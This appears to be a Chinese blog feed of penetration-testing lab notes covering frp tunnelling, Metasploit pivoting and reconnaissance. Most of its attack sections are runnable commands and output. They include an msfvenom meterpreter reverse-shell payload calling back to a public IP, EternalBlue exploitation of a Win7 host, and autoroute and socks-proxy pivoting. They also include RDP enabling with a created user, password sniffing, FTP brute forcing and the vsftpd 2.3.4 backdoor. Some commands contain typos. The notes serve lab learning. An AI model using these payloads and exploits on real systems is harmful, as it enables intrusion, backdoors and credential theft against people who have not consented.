./frps.ini</p><p>成功后查看server端日志</p><p>发现已经可以监听到6000</p><p>ssh连接公网ip6000</p><p># ssh root@ip_addr -p6000</p><p>我们是以127.0.0.1登录的ssh服务 查看</p><p>w</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[ssh客户端]</span><br><span class="line">A--&gt;A1[ssh网关]</span><br><span class="line">A1--&gt;A2[Frp服务器]</span><br><span class="line">A2--&gt;A3[Frp客户端]</span><br><span class="line">A3--&gt;A4[内网ssh服务]</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>SSH 客户端访问公网将自己的 SIP 转换为公网 I P</p></li><li><p>FRP 服务器收到访问代理端口的请求，将 DIP 转换为后端服务器 I P 地址。</p></li><li><p> FRP 客户端收到来自服务器的流量将 S IP 转换为 127.0.0.1</p></li><li><p>内网主机收到来自 FRP 客户端的 S SH 登录请求。登录 127.0.0.1</p></li></ol><p>注： SIP表示源地址，DIP表示目的地址，DPORT表示目标端口</p><h3 id="拓：映射局域网内其他主机服务"><a href="#拓：映射局域网内其他主机服务" class="headerlink" title="拓：映射局域网内其他主机服务"></a>拓：映射局域网内其他主机服务</h3><p>修改local_ip为内网其他主机</p><p>local_ip = 192.168.3.26</p><p>重新启动客户端</p><p>./frpc -c frpc.ini</p><p>ssh <a href="mailto:&#x75;&#x62;&#x75;&#110;&#116;&#x75;&#64;&#x38;&#50;&#46;&#49;&#53;&#x37;&#x2e;&#x31;&#55;&#52;&#x2e;&#50;&#x32;&#x36;">&#x75;&#x62;&#x75;&#110;&#116;&#x75;&#64;&#x38;&#50;&#46;&#49;&#53;&#x37;&#x2e;&#x31;&#55;&#52;&#x2e;&#50;&#x32;&#x36;</a> -p6000</p><p>这时会报错因为ssh服务以为我们连接的是同一台机子，这时删除known_hosts</p><p>remove with</p><p># ssh-keygen -f “/root/.ssh/known_hosts” -R “[82.157.174.226]:6000”</p><p>ssh <a href="mailto:&#117;&#98;&#x75;&#x6e;&#116;&#x75;&#x40;&#x38;&#50;&#x2e;&#49;&#x35;&#x37;&#x2e;&#49;&#55;&#52;&#x2e;&#x32;&#50;&#54;">&#117;&#98;&#x75;&#x6e;&#116;&#x75;&#x40;&#x38;&#50;&#x2e;&#49;&#x35;&#x37;&#x2e;&#49;&#55;&#52;&#x2e;&#x32;&#50;&#54;</a> -p6000</p><p>w #查看服务</p><h3 id="配置frp仪表盘和认证"><a href="#配置frp仪表盘和认证" class="headerlink" title="配置frp仪表盘和认证"></a>配置frp仪表盘和认证</h3><p>我们前面启动服务端仅配置了侦听端口，实际上frp 服务端有很多配置参数，比如 frp 可以提供web 界面查看所有访问请求的详细信息。以及服务端和客户连接时进行认证，否则其他人都可以映射到你的 frp 服务器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">vhost_http_port = 80 #虚拟主机端口，如果要发布 web 服务则需配置该项。</span><br><span class="line">dashboard_port = 7500 #仪表盘端口</span><br><span class="line">dashboard_user = admin#仪表盘用户名</span><br><span class="line">dashboard_pwd = 123456 #仪表盘密码</span><br><span class="line">authentication_method = token #认证使用 token</span><br><span class="line">token = admin123456 #token</span><br><span class="line">配置文件必须删除中文注释</span><br></pre></td></tr></table></figure><p>启动服务端 | 服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line">/frp_0.37.0_linux_amd64</span><br><span class="line">vim frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr =82.157.174.226</span><br><span class="line">server_port = 7000</span><br><span class="line">token = admin123456 #配置 token 必须和 server 一致</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line">[web]</span><br><span class="line">type = http # 协议 http</span><br><span class="line">local_port = 80 #本地端口</span><br><span class="line">custom_domains = domain name #指定域名， web 服务需要域名访问才可以。</span><br></pre></td></tr></table></figure><p>启动客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line">配置DNS解析，如果是实际场景可以在域名解析中将域名解析到 V PS 服务器即可。</span><br><span class="line">HOSTS文件： C:\Windows\System32\drivers\etc\hosts 添加行</span><br><span class="line">149.129.65.126 domain name</span><br></pre></td></tr></table></figure><p>访问web服务 <a href="http://domain_name/">http://domain_name/</a></p><p>访问仪表盘用户名：admin 密码： 123456</p><p>仪表板功能比较简洁，就是一些基础配置信息以及访问请求图标。</p><h1 id="kali配置MSF接收来自公网的shell"><a href="#kali配置MSF接收来自公网的shell" class="headerlink" title="kali配置MSF接收来自公网的shell"></a>kali配置MSF接收来自公网的shell</h1><p>服务端配置文件不用改变，我们修改客户端配置文件即可。</p><p>在kali中配置</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">vim frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 82.157.174.226</span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="meta">#</span><span class="bash">authentication_method = token</span></span><br><span class="line">token = admin123456</span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">local_port = 22</span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_port = 80</span><br><span class="line">custom_domains = domain_name</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_port = 4444</span><br><span class="line">local_ip = 192.168.3.26</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure><p>添加MSF映射配置即可，协议 tcp 本地端口： 4444 本地 ip 192.168.3.26 映射端口 8000</p><p>生成<br>payload ,LHOST 指定为公网 IP LPORT 指定为公网映射端口。<br>msfvenom -a x64 –platform linux -p linux/x64/ me terpreter /reverse_tcp LHOST=82.157.174.226 LPORT= 8000 -b “\x00” -f elf -o test</p><p>复制到Ubuntu上</p><p>scp test <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x33;&#46;&#x32;&#x36;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x33;&#46;&#x32;&#x36;</a>:/root/</p><p>启动MSF 并配置侦听<br>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/ me terpreter/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit</p><p>LHOST 和 LPORT 要和 frpc.ini 配置文件中的 local_ip 和 local_port 一致。</p><p>在Ubuntu26上执行命令</p><p>chmod +x test</p><p>./test</p><p>MSF 成功接收 shell</p><h1 id="跨网段获取内网shell"><a href="#跨网段获取内网shell" class="headerlink" title="跨网段获取内网shell"></a>跨网段获取内网shell</h1><h2 id="使用-MSF-自带代理功能实现内网渗透"><a href="#使用-MSF-自带代理功能实现内网渗透" class="headerlink" title="使用 MSF 自带代理功能实现内网渗透"></a>使用 MSF 自带代理功能实现内网渗透</h2><p>当前实验的前提是已经通过<br>MSF 获取到内网 shell ，就比如内网对外网发布 web 服务，我们通过web 服务获取 shell ，然后通过 web 主机对内网进行渗透。</p><p>环境拓扑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A(kali:192.168.3.24)</span><br><span class="line">B(内部部接口: 192.168.88.26)</span><br><span class="line">A--&gt;A1(外部接口: 192.168.3.26)</span><br><span class="line">B--&gt;B1(内网主机win7: 192.168.88.28)</span><br></pre></td></tr></table></figure><p>环境说明：<br>DMZ 主机可以是 Win 也可以是 Linux 。区别在于 win 7 可以通过 MS17 010 获取shell Linux 则推荐生成 payload 直接运行，本环境使用 Linux 。<br>Kali主机网络模式：桥接<br>DMZ 主机网络模式：桥接 仅主机<br>内网主机Win7 网络模式：仅主机</p><p>msfvenom -a x64 –platform linux -p linux/x64/ me terpreter /reverse_tcp LHOST=82.157.174.226 LPORT= 8000 -b “\x00” -f elf -o test</p><p>scp test <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#x32;&#x36;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#x32;&#x36;</a>:/root/</p><p>配置侦听：<br>msfdb run</p><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.1.53<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit</p></blockquote><p>获取内网网段<br>meterpreter &gt; run get_local_subnets<br>Local subnet: 192.168.3.0/255.255.255.0</p><p>Local subnet:<br>192.168.88.0 /255.255.255.0<br>配置路由，通过配置路由可以让我们Kali 主机访问目标网络。<br>meterpreter &gt; run autoroute -s 192.168.88.0/24</p><p>查看路由信息</p><p>run autoroute -p</p><p>查看arp缓存可以帮助我们快速获取与该主机通讯过的内网主机信息。</p><p>meterpreter &gt; arp</p><p>如果ARP 没有获取有用的信息也无所谓，可以通过配置代理后对内网扫描。</p><p>配置socks 代理<br>meterpreter &gt; background<br>exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>auxiliary( server/socks_proxy ) &gt; set srvhost 192.168.3.24<br>auxiliary( server/socks_proxy ) &gt; run</p><p>#vim /etc/proxychains4.conf</p><p>注释掉第<br>52 行<br>52 #proxy_dns<br>文件默认修改最后一行为我们刚刚设置的代理，默认的代理地址是暗网代理。<br>socks 5 192.168.3.24 1080</p><p>通过代理扫描内网。<br>proxychains 4 nmap -Pn -sT -p 445 –script=smb-vuln-ms17-010.nse 192.168.88.0/24</p><p>-Pn ：扫描主机检测是否受到数据包过滤软件或防火墙的保护。<br>-sT ：扫描 TCP 数据包已建立的连接 connect</p><p>通过代理启动msf<br>proxychains 4 msfdb run</p><blockquote><p>use exploit/windows/smb/ms17_010_eternalblue<br>我们使用代理访问内网所以<br>payload 选择 bind 模式。<br>msf6<br>explo it(windows/smb/ms17_010_eternalblue) &gt; set payload<br>windows/x64/meterpreter/bind_tcp<br>msf6<br>exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.88.28<br>msf6<br>exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 9988<br>msf6<br>exploit(windows/smb/ms17_010_ eternalblue) &gt; run<br>注：MSF 的代理功能并不是很稳定，如果执行失败可重复执行。 若是重复无果，可放弃使用 M SF 代<br>理，选择 Frp 搭建内网代理。</p></blockquote><p>开启RDP 远程桌面<br>meterpreter &gt; run post/windows/manage/enable_rdp<br>创建远程桌面用户<br>meterpreter &gt; run<br>post/windows/manage/enable_rdp USERNAME=admin<br>PASSWORD=123456</p><p>映射内网主机远程桌面端口到kali</p><p>meterpreter &gt; portfwd add L 192.168.1.53 l 2323 p 3389 r 192.168.88.57</p><p>kali通过远程桌面登录内网主机<br>rdesktop u xuegod p 123456 192.168.3.24:2323<br>物理机通过远程桌面连接内网主机<br>Win+R 运行： mstsc</p><p>win10远程连接 账号密码</p><h2 id="通过-Frp-内网穿透来实现内网渗透"><a href="#通过-Frp-内网穿透来实现内网渗透" class="headerlink" title="通过 Frp 内网穿透来实现内网渗透"></a>通过 Frp 内网穿透来实现内网渗透</h2><p>配置frp服务器</p><p>vim frps.ini</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[commom]</span><br><span class="line">bind_port = 7000</span><br><span class="line">authentication_method = token</span><br><span class="line">token = admin123456</span><br></pre></td></tr></table></figure><p>启动服务端</p><p>0.33.0_linux_amd64# ./frps c frps.ini</p><p>暂停 与上面类似</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Metasploit信息搜集</title>
      <link href="/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>发现目标网段的存活主机:</p><p>我们可以利用auxiliary这个模块来获取目标网端的信息，包括端口开放情况、主机存活情况。</p><blockquote><p>auxiliary/scanner/discovery/arp_sweep</p><p>auxiliary/scancer/smb/smb_version 存活的445主机</p><p>auxiliary/scanner/portscan/syn  端口扫描</p><p>auxiliary/scanner/telnet/telnet_version telent服务扫描</p><p>auxiliary/scanner/rdp/rdp_scanner 远程桌面服务扫描</p><p>auxiliary/scanner/ssh/ssh_version ssh主机扫描</p></blockquote><p>一般情况下我们在渗透测试的时候，如果在不知道资产的情况下，我们会把<strong>整个网端进行扫描存活主机</strong>，然后再<strong>对存活的信息收集信息</strong>，这样的话就可以缩短我们的渗透测试时间，而不盲目的去测试，有时候盲目信息收集会导致后期渗透的道路都是弯的，达不到预期的效果。</p><p>不管是端口扫描还是探测存活主机，都是要设置目标IP地址set rhosts ip地址，如果扫描整个网段的话，最后设置一下线程：set thread 线程数(根据情况设置)。</p><p>执行run命令开始扫描网段的存活主机，发现有服务器存活，这样的话我们就可以对这些存活主机进行下一步的信息收集，比如22、445、3389等敏感端口开放情况探测，在这里需要说明一下，以小白的渗透测试经验，一般我先不扫描整个网端，因为这样对目标主机有损耗，可以直接扫描有溢出漏洞的高危端口，如果有的话，那么就可以通过溢出进行提权，这样的方法也是一种捷径。相反的情况下，如果全端口扫描的话建议用nmap工具。</p><p>kali有自己的密码，内置密码表的地址：/usr/share/wordlists/metasploit/</p><p>一般爆破的话我们可以对ssh、mysql、sql、Oracle、vnc、telnet等常用的端口</p><blockquote><p>1）auxiliary/scanner/mysql/mysql_login</p><p>2）auxiliary/scanner/mssql/mssql_login</p><p>3）auxiliary/scanner/ssh/ssh_login</p></blockquote><h1 id="tcp协议的信息搜集"><a href="#tcp协议的信息搜集" class="headerlink" title="tcp协议的信息搜集"></a>tcp协议的信息搜集</h1><h2 id="使用nmap和arp-sweep搜集信息"><a href="#使用nmap和arp-sweep搜集信息" class="headerlink" title="使用nmap和arp_sweep搜集信息"></a>使用nmap和arp_sweep搜集信息</h2><p>#msfconsole</p><p>msf6 &gt; db_nmap -sV 192.168.3.1</p><p>ARP 扫描</p><p>msf6 &gt; use auxiliary/scanner/discovery/arp_sweep</p><p>查看需要哪些参数</p><p>show options</p><p>配置RHOSTS 扫描的目标网络</p><p>set RHOSTS 192.168.3.0/24</p><p>SHOST 和 SMAC 是伪造的IP 和MAC地址使用的</p><p>配置线程数</p><p>set THREADS 30</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf1.png" alt="结果"></p><h2 id="使用半连接方式扫描TCP"><a href="#使用半连接方式扫描TCP" class="headerlink" title="使用半连接方式扫描TCP"></a>使用半连接方式扫描TCP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search portscan</span><br><span class="line">msf6 &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set PORTS 80</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set RHOSTS 192.168.3.1/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set THREADS 20</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf2.png" alt="配置选项"></p><p>扫描结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; run</span><br><span class="line">[+]  TCP OPEN 192.168.3.1:80</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="使用-auxiliary-sniffer-下的-psnuffle-模块进行密码嗅探"><a href="#使用-auxiliary-sniffer-下的-psnuffle-模块进行密码嗅探" class="headerlink" title="使用 auxiliary sniffer 下的 psnuffle 模块进行密码嗅探"></a>使用 auxiliary sniffer 下的 psnuffle 模块进行密码嗅探</h2><p>这个 psnuffle 模块 可以像以前的 dsniff 命令一样，去嗅探密码， 只支持 pop3，imap，ftp，HTTP GET 协议 。</p><p>扩展：Dsniff 是一个著名的网络嗅探工具包、高级口令嗅探工具、综合性的网络嗅探工具包。</p><p>msf6 &gt; use auxiliary/sniffer/psnuffle</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf3.png" alt="结果"></p><p>shift + ctrl + t 建立新终端 登录ftp</p><p>安装ftp apt install lftp -y</p><p>lftp -u msfadmin 192.168.3.27 # 27为metasploitable2-Linux靶机的ip</p><p>密码 msfadmin</p><p>ls</p><p>回到msf发现信息已经拿到</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf4.png" alt="结果"></p><p>关闭后台</p><p>jobs</p><p>kill 0</p><p><code>？这不是我已经输过账号和密码了吗</code></p><h1 id="基于SNMP协议收集主机信息"><a href="#基于SNMP协议收集主机信息" class="headerlink" title="基于SNMP协议收集主机信息"></a>基于SNMP协议收集主机信息</h1><p><code>简单网络管理协议</code>(SNMP Simple Network Management Protocol )，由一组网络管理的标准组成，包含一个应用层协议（ application layer protocol ）、数据库</p><p>模型 database schema ）和一组资源对象。该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。</p><p>在典型的SNMP用法中，有许多系统被管理，而且是有一或多个系统在管理它们。每一个被管理的系统上有运行一个叫做代理者（agent）的软件组件，且透SNMP</p><p>对管理系统报告信息。</p><p><strong>将kali设为代理者 靶机向kali发送信息</strong></p><p>我们使用root 用户先到 Metasploitable2 Linux 主机上修改一下 SNMP 服务，因为默认服务是不对外开放的。</p><p><code>msfadmin@metasploitable:~vim /etc/default/snmpd</code></p><p>改第11 行</p><p><code>SNMPDOPTS=&#39;Lsd Lf /dev/null u snmp I smux p /var/run/snmpd.pid 0.0.0.0</code></p><p>保存退出</p><p>重启SNMP 服务</p><p><code>msfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart</code></p><p>确认服务监听正常</p><p><code>msfadmin@metasploitable:~$ netstat antup grep 161</code></p><h3 id="使用-snmp-enum-模块通过-snmp-协议扫描目标服务器信息"><a href="#使用-snmp-enum-模块通过-snmp-协议扫描目标服务器信息" class="headerlink" title="使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息"></a>使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息</h3><blockquote><p>msf6 &gt;use auxiliary/scanner/snmp/snmp_enum<br>msf6 &gt; auxiliary(scanner/snmp/snmp_enum) &gt; show options<br>msf6 &gt;auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 192.168.3.27<br>msf6 &gt;auxiliary(scanner/snmp/snmp_enum) &gt; run</p></blockquote><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf5.png" alt="结果"></p><p>可以看到snmp探测到东西很多，但服务器硬件和运行的进程信息是其他扫描方式，该协议获取不到的</p><h1 id="基于SMB协议收集信息"><a href="#基于SMB协议收集信息" class="headerlink" title="基于SMB协议收集信息"></a>基于SMB协议收集信息</h1><p><strong>服务器消息块</strong>（Server Message Block，缩写为SMB），又称<strong>网络文件共享系统</strong>（Common Internet File System，缩写为CIFS），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件，打印机，串行端口和通讯等资源。它也提供经认证的进程间通信机能。它主要用在装有Microsoft Windows的机器上，在这样的机器上被称为Microsoft Windows Network。</p><p>经过Unix 服务器厂商重新开发后，它可以用于连接 Unix 服务器和 Windows 客户机，执行打印和文件共享等任务。</p><h2 id="使用-smb-enumshares-基于-SMB-协议扫共享文件（账号、密码）"><a href="#使用-smb-enumshares-基于-SMB-协议扫共享文件（账号、密码）" class="headerlink" title="使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）"></a>使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）</h2><p>SMB 的模块中基本上都是可以配置用户名和密码的，配置了用户名和密码某些模块扫描的结果会更满足我们的需求 。</p><p>新建文件夹设置共享</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf7.png" alt="共享信息"></p><p>添加admin信息获取密码(这是我设置的密码是123456)</p><p><code>msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</code></p><p><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 192.168.3.28</code><br>RHOSTS =&gt; 192.168.3.28<br><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUSER admin</code><br>SMBUSER =&gt; admin<br><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPASS 123456</code><br>SMBPASS =&gt; 123456</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf6.png" alt="run"></p><p>共享文件目录除了SMB还有 4 个是隐藏的共享目录。</p><h2 id="使用-smb-lookupsid-扫描系统用户信息-SID枚举"><a href="#使用-smb-lookupsid-扫描系统用户信息-SID枚举" class="headerlink" title="使用 smb_lookupsid 扫描系统用户信息(SID枚举)"></a>使用 smb_lookupsid 扫描系统用户信息(SID枚举)</h2><p>新建一个用户phantom 123456</p><p>SID 是 Windows 中每一个用户的ID，更改用户名SID也是不会改变的。</p><p>msf6 &gt; use auxiliary/scanner/smb/smb_lookupsid<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 192.168.3.33 #win7的地址<br>RHOSTS =&gt; 192.168.3.33<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUSER admin<br>SMBUSER =&gt; admin<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPASS 123456<br>SMBPASS =&gt; 123456<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf8.png" alt="run"></p><h2 id="使用-smb-version-基于-SMB-协议扫描版本号"><a href="#使用-smb-version-基于-SMB-协议扫描版本号" class="headerlink" title="使用 smb_version 基于 SMB 协议扫描版本号"></a>使用 smb_version 基于 SMB 协议扫描版本号</h2><p>use auxiliary/scanner/smb/smb_version设置</p><p>set RHOSTS 192.168.3.28, 192.168.3.23</p><p>run</p><p>可以扫描到本机的详细信息，操作系统的版本号(本机信息就不放截图了)</p><h1 id="基于SSH协议收集信息"><a href="#基于SSH协议收集信息" class="headerlink" title="基于SSH协议收集信息"></a>基于SSH协议收集信息</h1><h2 id="查看-ssh-服务的版本信息"><a href="#查看-ssh-服务的版本信息" class="headerlink" title="查看 ssh 服务的版本信息"></a>查看 ssh 服务的版本信息</h2><p>root@kali:~# echo “msfadmin msfadmin” &gt;&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </p><p>msf6 &gt; use auxiliary/scanner/ssh/ssh_version</p><p>msf6 auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ssh/ssh_version) &gt; set USERPASS_FiLE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt<br>USERPASS_FiLE =&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf9.png" alt="run"></p><h1 id="基于FTP协议收集信息"><a href="#基于FTP协议收集信息" class="headerlink" title="基于FTP协议收集信息"></a>基于FTP协议收集信息</h1><h2 id="查看-ftp-服务的版本信息"><a href="#查看-ftp-服务的版本信息" class="headerlink" title="查看 ftp 服务的版本信息"></a>查看 ftp 服务的版本信息</h2><p>msf6 &gt; use auxiliary/scanner/ftp/ftp_version<br>msf6 auxiliary(scanner/ftp/ftp_version) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ftp/ftp_version) &gt; run</p><p>[+] 192.168.3.27:21       - FTP Banner: ‘220 (vsFTPd 2.3.4)\x0d\x0a’<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p><p>可以看到FTP版本为2.3.4</p><p>search ftp</p><p>use exploit/unix/ftp/vsftpd_234_backdoor</p><p>set 192.168.3.27</p><p>run获得root权限</p><p><code>id</code><br><code>uid=0(root) gid=0(root)</code></p><h2 id="2-ftp匿名登录扫描"><a href="#2-ftp匿名登录扫描" class="headerlink" title="2.ftp匿名登录扫描"></a>2.ftp匿名登录扫描</h2><p>msf6 &gt; use auxiliary/scanner/ftp/anonymous<br>msf6 auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ftp/anonymous) &gt; run</p><p>[+] 192.168.3.27:21       - 192.168.3.27:21 - Anonymous READ (220 (vsFTPd 2.3.4))<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p><h2 id="3-ftp暴力破解"><a href="#3-ftp暴力破解" class="headerlink" title="3.ftp暴力破解"></a>3.ftp暴力破解</h2><p>use auxiliary/scanner/ftp/ftp_login</p><p>set RHOSTS 192.168.3.27</p><p>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</p><p>run前面的都是错的</p><p>[+] 192.168.3.27:21       - 192.168.3.27:21 - Login Successful: msfadmin:msfadmin<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Metasploit隐藏后门</title>
      <link href="/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
      <url>/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-创建一个新用户来远程连接-win7-桌面"><a href="#1-创建一个新用户来远程连接-win7-桌面" class="headerlink" title="1.创建一个新用户来远程连接 win7 桌面"></a>1.创建一个新用户来远程连接 win7 桌面</h2><p>RDP概述：远程桌面协议（ RDP, Remote Desktop Protocol ）是一个多通道 multi channel的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。</p><h3 id="1-1使用enable-rdp脚本开启远程桌面并创建用户"><a href="#1-1使用enable-rdp脚本开启远程桌面并创建用户" class="headerlink" title="1.1使用enable_rdp脚本开启远程桌面并创建用户"></a>1.1使用enable_rdp脚本开启远程桌面并创建用户</h3><p>meterpreter &gt; run post/windows/manage/enable_rdp</p><p>meterpreter &gt; run post/windows/manage/enable_rdp USERNAME=phantom PASSWORD=123456</p><p>开一个新的终端</p><p>root@kali:~# rdesktop 192.168.3.33</p><p>登录账号 phantom 123456</p><h2 id="1-2-关闭主机防护策略并开启后门"><a href="#1-2-关闭主机防护策略并开启后门" class="headerlink" title="1.2.关闭主机防护策略并开启后门"></a>1.2.关闭主机防护策略并开启后门</h2><p>通过ms 17 010 永恒之蓝获取到的 shell 